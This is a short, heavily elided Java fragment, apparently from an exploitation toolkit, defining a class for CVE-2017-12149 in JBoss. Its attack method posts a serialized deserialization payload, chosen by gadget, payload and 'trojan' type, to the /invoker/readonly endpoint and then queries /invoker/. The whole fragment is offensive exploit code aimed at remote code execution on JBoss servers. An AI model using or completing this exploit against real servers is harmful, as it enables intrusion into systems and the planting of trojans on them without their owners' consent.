...
public class JBoss_CVE_2017_12149 extends BaseExp implements AttackBase {
    public boolean attack(String stripUrl, String gadgetType, String payloadType, String trojanType)  {
        ...
        try {
            ...
            this.launchPostByte(stripUrl + "/invoker/readonly" , payload, mime, header);
            header.put("X-Requested-With", "XmlHTTPRequest");
            Response response = this.launch(stripUrl + "/invoker/", header);
